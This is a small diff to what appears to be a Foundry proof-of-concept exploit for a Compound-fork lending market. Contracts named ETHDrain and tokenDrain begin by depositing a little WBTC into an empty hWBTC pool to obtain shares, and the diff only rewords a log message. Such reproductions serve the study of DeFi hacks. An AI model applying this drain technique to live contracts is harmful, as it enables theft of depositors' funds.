@@ -159,7 +159,7 @@ contract ETHDrain is Test {
     crETH CEtherDelegate;
 
     constructor(crETH Delegate) payable {
-        console.log("First step, Deposit a small amount of WBTC to the almost empty hWBTC pool to obtain shares");
+        console.log("First step, Deposit a small amount of WBTC to the empty hWBTC pool to obtain shares");
         CEtherDelegate = Delegate;
         WBTC.approve(address(hWBTC), type(uint256).max);
         hWBTC.mint(4 * 1e8);
@@ -230,7 +230,7 @@ contract tokenDrain is Test {
     ICErc20Delegate CErc20Delegate;
 
     constructor(ICErc20Delegate Delegate) payable {
-        console.log("First step, Deposit a small amount of WBTC to the almost empty hWBTC pool to obtain shares");
+        console.log("First step, Deposit a small amount of WBTC to the empty hWBTC pool to obtain shares");
         CErc20Delegate = Delegate;
         WBTC.approve(address(hWBTC), type(uint256).max);
         hWBTC.mint(4 * 1e8);
